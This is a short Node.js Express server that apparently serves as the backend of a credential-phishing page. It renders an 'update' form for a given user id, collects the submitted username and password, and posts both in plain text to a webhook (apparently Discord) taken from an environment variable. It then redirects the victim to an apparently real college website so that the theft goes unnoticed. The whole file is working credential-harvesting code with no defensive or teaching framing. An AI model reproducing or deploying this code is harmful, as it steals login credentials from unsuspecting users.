const path = require("path");
const ejs = require("ejs");
const config = require('./config.json');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const express = require('express');

const app = express();

app.engine("html", ejs.renderFile);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, "website", "views"));
app.use(express.static(path.join(__dirname, "website", "public")));

app.set('json spaces', 1);

app.get('/', (req, res) => {
  res.render('index', {
    title: "Home"
  });
});

app.get('/update/:id', (req, res) => {
  const user = req.params.id;
  res.render('update', {
    title: "Home",
    user: user
  });
});

app.use(express.urlencoded({ extended: true })); 

app.post('/update/new', async (req, res) => {
  try {
    const username = req.body.username;
    const password = req.body.password;

    const webhookURL = process.env['hook'];
    const message = {
      content: 'New form submission',
      embeds: [
        {
          title: 'Form Submission',
          fields: [
            {
              name: 'Username',
              value: username,
            },
            {
              name: 'Password',
              value: password,
            },
          ],
        },
      ],
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    res.redirect('https://fcrit.ac.in/');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Internal Server Error' });
  }
});

module.exports = app;